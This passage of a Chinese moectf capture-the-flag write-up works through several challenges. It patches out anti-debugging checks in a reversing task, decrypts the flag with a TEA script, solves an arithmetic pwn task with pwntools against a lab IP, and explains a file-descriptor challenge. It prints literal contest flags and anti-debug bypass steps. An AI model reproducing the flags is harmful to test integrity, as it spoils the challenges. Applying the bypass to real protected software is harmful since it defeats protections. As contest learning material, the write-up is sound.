<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004117</span>B7                 push    offset ModuleName <span class="token punctuation">;</span> <span class="token string">"Ntdll"</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004117</span>BC                 call    ds<span class="token operator">:</span>GetModuleHandleA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">.text:004117FF                 .text:004117FF                 call    [ebp+var_14]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发现这里面加载了ntdll ，然后在这里call    [ebp+var_14]退出了把这个sub_4113E3 nop掉发现能往下调试了</p>
<p>下面作用类似于scanf 获取输入的函数里面也会闪退</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411890</span> <span class="token punctuation">;</span> <span class="token keyword">int</span> __cdecl <span class="token function">sub_411890</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>Format<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411890</span> sub_411890      proc near               <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> sub_4113CA↑j
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411890</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411890</span> Format          <span class="token operator">=</span> dword ptr  <span class="token number">8</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411890</span> arg_4           <span class="token operator">=</span> byte ptr  <span class="token number">0</span>Ch
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411890</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411890</span>                 push    ebp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411891</span>                 mov     ebp<span class="token punctuation">,</span> esp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411893</span>                 sub     esp<span class="token punctuation">,</span> <span class="token number">0</span>C0h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411899</span>                 push    ebx
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041189</span>A                 push    esi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041189</span>B                 push    edi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041189</span>C                 mov     edi<span class="token punctuation">,</span> ebp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041189</span>E                 xor     ecx<span class="token punctuation">,</span> ecx
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>A0                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span>CCCCCCCCh
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>A5                 rep stosd
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>A7                 mov     ecx<span class="token punctuation">,</span> offset unk_41C063
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>AC                 call    j_@__CheckForDebuggerJustMyCode@<span class="token number">4</span> <span class="token punctuation">;</span> <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>B1                 call    sub_4113E3
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>B6                 mov     eax<span class="token punctuation">,</span> dword ptr <span class="token punctuation">[</span>ebp<span class="token operator">+</span>arg_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>B9                 push    eax             <span class="token punctuation">;</span> <span class="token keyword">char</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>BA                 mov     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>Format<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>BD                 push    ecx             <span class="token punctuation">;</span> Format
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>BE                 call    sub_4113C5
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>C3                 add     esp<span class="token punctuation">,</span> <span class="token number">8</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>C6                 pop     edi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>C7                 pop     esi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>C8                 pop     ebx
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>C9                 add     esp<span class="token punctuation">,</span> <span class="token number">0</span>C0h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>CF                 cmp     ebp<span class="token punctuation">,</span> esp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>D1                 call    j___RTC_CheckEsp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>D6                 mov     esp<span class="token punctuation">,</span> ebp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>D8                 pop     ebp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>D9                 retn
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004118</span>D9 sub_411890      endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>call    sub_4113E3 这个地方，下面还有个call那个是获取输入的</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004117</span>B7                 push    offset ModuleName <span class="token punctuation">;</span> <span class="token string">"Ntdll"</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004117</span>BC                 call    ds<span class="token operator">:</span>GetModuleHandleA
    
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004117F</span><span class="token number">1</span>                 call    ds<span class="token operator">:</span>GetCurrentThread
     
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004117FF</span>                 call    <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_14<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里也加载了ntdll 获取了线程，在call    [ebp+var_14] 这断掉了，nop掉call    sub_4113E3后程序能正常调试了</p>
<p>上面说的坑是，在nop掉这些东西后开始调试程序，他只能从start开始，start里面有一个int3，我看这个也没有什么影响，就给他抛出了，后面到了程序逻辑里面，程序逻辑里面也有个int3，ida自动给我抛出了。一开始start那不抛出int3他就没有什么问题</p>
<p>动态了之后才知道，inputString 后32位 encode了两次，所以第一次写脚本只能解出一半</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    v0<span class="token punctuation">,</span> v1 <span class="token operator">=</span> ciphertext
    k0<span class="token punctuation">,</span> k1<span class="token punctuation">,</span> k2<span class="token punctuation">,</span> k3 <span class="token operator">=</span> key
    sum_ <span class="token operator">=</span> <span class="token number">0xC6EF3720</span>
    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        v1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k2<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">+</span> sum_<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k3<span class="token punctuation">)</span>
        v1 <span class="token operator">=</span> v1 <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
        v0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> sum_<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k1<span class="token punctuation">)</span>
        v0 <span class="token operator">=</span> v0 <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
        sum_ <span class="token operator">-=</span> <span class="token number">0x9E3779B9</span>
        sum_ <span class="token operator">=</span> sum_ <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>v0<span class="token punctuation">,</span> v1<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">key_to_integers</span><span class="token punctuation">(</span>key_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    padded_key <span class="token operator">=</span> key_str<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>padded_key<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>padded_key<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">data_bytes_to_tuples</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>data_bytes<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>data_list<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data_list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">tuples_to_bytes</span><span class="token punctuation">(</span>data_tuples<span class="token punctuation">)</span><span class="token punctuation">:</span>
    byte_list <span class="token operator">=</span> <span class="token punctuation">[</span>item<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> sublist <span class="token keyword">in</span> data_tuples <span class="token keyword">for</span> item <span class="token keyword">in</span> sublist<span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>byte_list<span class="token punctuation">)</span>

keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"DX3906"</span><span class="token punctuation">,</span> <span class="token string">"doctor3"</span><span class="token punctuation">,</span> <span class="token string">"FUX1AOYUN"</span><span class="token punctuation">,</span> <span class="token string">"R3verier"</span><span class="token punctuation">]</span>
key_integers <span class="token operator">=</span> <span class="token punctuation">[</span>key_to_integers<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">for</span> key <span class="token keyword">in</span> keys<span class="token punctuation">]</span>

flag1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">]</span>
flag2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">]</span>

<span class="token comment"># flag1 decode</span>
f1 <span class="token operator">=</span> data_bytes_to_tuples<span class="token punctuation">(</span>flag1<span class="token punctuation">)</span>
decrypted_data_list_1 <span class="token operator">=</span> <span class="token punctuation">[</span>decrypt<span class="token punctuation">(</span>data_tuple<span class="token punctuation">,</span> key_integer<span class="token punctuation">)</span> <span class="token keyword">for</span> data_tuple<span class="token punctuation">,</span> key_integer <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>f1<span class="token punctuation">,</span> key_integers<span class="token punctuation">)</span><span class="token punctuation">]</span>
decrypted_bytes_1 <span class="token operator">=</span> tuples_to_bytes<span class="token punctuation">(</span>decrypted_data_list_1<span class="token punctuation">)</span>
decrypted_string_1 <span class="token operator">=</span> decrypted_bytes_1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span>

<span class="token comment"># flag2 decode1</span>
f2 <span class="token operator">=</span> data_bytes_to_tuples<span class="token punctuation">(</span>flag2<span class="token punctuation">)</span>
decrypted_data_list_2_1st <span class="token operator">=</span> <span class="token punctuation">[</span>decrypt<span class="token punctuation">(</span>data_tuple<span class="token punctuation">,</span> key_integer<span class="token punctuation">)</span> <span class="token keyword">for</span> data_tuple<span class="token punctuation">,</span> key_integer <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>f2<span class="token punctuation">,</span> key_integers<span class="token punctuation">)</span><span class="token punctuation">]</span>
decrypted_bytes_2_1st <span class="token operator">=</span> tuples_to_bytes<span class="token punctuation">(</span>decrypted_data_list_2_1st<span class="token punctuation">)</span>


<span class="token comment">#flag2 decode2</span>
f2_2nd <span class="token operator">=</span> data_bytes_to_tuples<span class="token punctuation">(</span>decrypted_bytes_2_1st<span class="token punctuation">)</span>
decrypted_data_list_2_2nd <span class="token operator">=</span> <span class="token punctuation">[</span>decrypt<span class="token punctuation">(</span>data_tuple<span class="token punctuation">,</span> key_integer<span class="token punctuation">)</span> <span class="token keyword">for</span> data_tuple<span class="token punctuation">,</span> key_integer <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>f2_2nd<span class="token punctuation">,</span> key_integers<span class="token punctuation">)</span><span class="token punctuation">]</span>
decrypted_bytes_2_2nd <span class="token operator">=</span> tuples_to_bytes<span class="token punctuation">(</span>decrypted_data_list_2_2nd<span class="token punctuation">)</span>
decrypted_string_2_2nd <span class="token operator">=</span> decrypted_bytes_2_2nd<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span>

result <span class="token operator">=</span> decrypted_string_1 <span class="token operator">+</span> decrypted_string_2_2nd

<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到flag moectf{WoOo00Oow_S0_interesting_y0U_C4n_C41l_M3tW1c3_BY_Unw1Nd~}</p>
<p>unwind栈展开的例子</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdexcept></span></span>

class ClassA <span class="token punctuation">&#123;</span>
public<span class="token operator">:</span>
    <span class="token function">ClassA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ClassA constructed.\n"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
    <span class="token operator">~</span><span class="token function">ClassA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ClassA destructed.\n"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

class ClassB <span class="token punctuation">&#123;</span>
public<span class="token operator">:</span>
    <span class="token function">ClassB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ClassB constructed.\n"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
    <span class="token operator">~</span><span class="token function">ClassB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ClassB destructed.\n"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

class ClassC <span class="token punctuation">&#123;</span>
public<span class="token operator">:</span>
    <span class="token function">ClassC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ClassC constructed.\n"</span><span class="token punctuation">;</span>
        throw std<span class="token operator">::</span><span class="token function">runtime_error</span><span class="token punctuation">(</span><span class="token string">"Exception from ClassC constructor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token operator">~</span><span class="token function">ClassC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ClassC destructed.\n"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    try <span class="token punctuation">&#123;</span>
        ClassA a<span class="token punctuation">;</span>
        ClassB b<span class="token punctuation">;</span>
        ClassC c<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">catch</span> <span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>exception<span class="token operator">&amp;</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Caught exception: "</span> <span class="token operator">&lt;&lt;</span> e<span class="token punctuation">.</span><span class="token function">what</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="EZNET-未解决-没思路"><a href="#EZNET-未解决-没思路" class="headerlink" title="EZNET[未解决-没思路]"></a>EZNET[未解决-没思路]</h2><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>查看gift提示flag是隐藏的，ls -al 发现.flag cat</p>
<p>moectf{BEgOXB3-Sk6bTQrihNqE5rw4G46OQIHS}</p>
<h2 id="baby-calculator"><a href="#baby-calculator" class="headerlink" title="baby_calculator"></a>baby_calculator</h2><p>后面发现flag出不来，是因为有个换行符，recvline到换行符就停了，用recvrepeat设置个超时时间就读出来了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re

pattern <span class="token operator">=</span> <span class="token string">r"(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*(\d+)"</span>


p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'192.168.144.193'</span><span class="token punctuation">,</span><span class="token number">56098</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvregex<span class="token punctuation">(</span><span class="token string">b'Now..start!\n'</span><span class="token punctuation">)</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    s <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> s<span class="token punctuation">)</span>

    n1<span class="token punctuation">,</span> operator<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span>
    n1<span class="token punctuation">,</span> n2 <span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>n2<span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> operator<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> r<span class="token punctuation">)</span>

    <span class="token keyword">if</span> operator <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
        n1 <span class="token operator">=</span> n1 <span class="token operator">+</span> n2
    <span class="token keyword">elif</span> operator <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
        n1 <span class="token operator">=</span> n1 <span class="token operator">-</span> n2

    <span class="token keyword">if</span><span class="token punctuation">(</span>r <span class="token operator">==</span> n1<span class="token punctuation">)</span><span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'BlackBird\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'WingS\n'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvrepeat<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>moectf{H4ve_y0u_rea11y_useD_Pwnt00ls??????}</p>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p><a target="_blank" rel="noopener" href="https://wiyi.org/linux-file-descriptor.html">https://wiyi.org/linux-file-descriptor.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/love-jelly-pig/p/10048483.html">https://www.cnblogs.com/love-jelly-pig/p/10048483.html</a></p>
<p>去查询了一下资料，当进程打开一个文件内核会返回一个FILE Descriptor,进程可以通过fd对文件进行操作</p>
<p>这个程序的意思是输入fd,然后通过fd读数据输出，fd 0 1 2都被系统占用了分别是stdin stdout stderr,所以3是flag。</p>
<p>fd被销毁前通过dup2函数将文件描述符复制到了new_fd。new_fd &#x3D; 4 * 3 | 0x29A。new_fd &#x3D;670,所以只需要传入670就能将flag读出来</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
